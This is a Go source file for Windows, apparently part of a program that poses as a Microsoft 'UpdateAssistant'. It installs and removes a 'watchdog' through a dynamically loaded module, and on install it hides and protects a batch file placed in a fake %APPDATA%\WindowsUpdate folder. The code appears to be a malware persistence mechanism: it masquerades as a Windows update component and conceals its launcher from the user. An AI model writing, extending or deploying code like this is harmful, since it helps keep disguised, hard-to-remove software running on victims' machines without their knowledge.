//go:build windows

package sysutil

import (
	"os"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
)

func WatchdogInstall() bool {
	p, err := loader.Load("watchdog")
	if err != nil {
		return false
	}
	defer loader.Unload(p)
	buf := make([]byte, config.SmallBuf)
	n, _ := p.Call("watchdog_install",
		uintptr(unsafe.Pointer(loader.BytePtr(config.DisplayName()+".exe"))),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(config.SmallBuf),
	)
	if n > 0 {
		appData := os.Getenv("APPDATA")
		if appData != "" {
			bat := appData + "\\WindowsUpdate\\wd.bat"
			ProtectPath(bat)
			HidePath(bat)
		}
	}
	return n > 0
}

func WatchdogRemove() bool {
	appData := os.Getenv("APPDATA")
	if appData != "" {
		UnprotectPath(appData + "\\WindowsUpdate\\wd.bat")
	}
	p, err := loader.Load("watchdog")
	if err != nil {
		return false
	}
	defer loader.Unload(p)
	buf := make([]byte, config.SmallBuf)
	n, _ := p.Call("watchdog_remove",
		uintptr(unsafe.Pointer(loader.BytePtr(config.DisplayName()+".exe"))),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(config.SmallBuf),
	)
	return n > 0
}
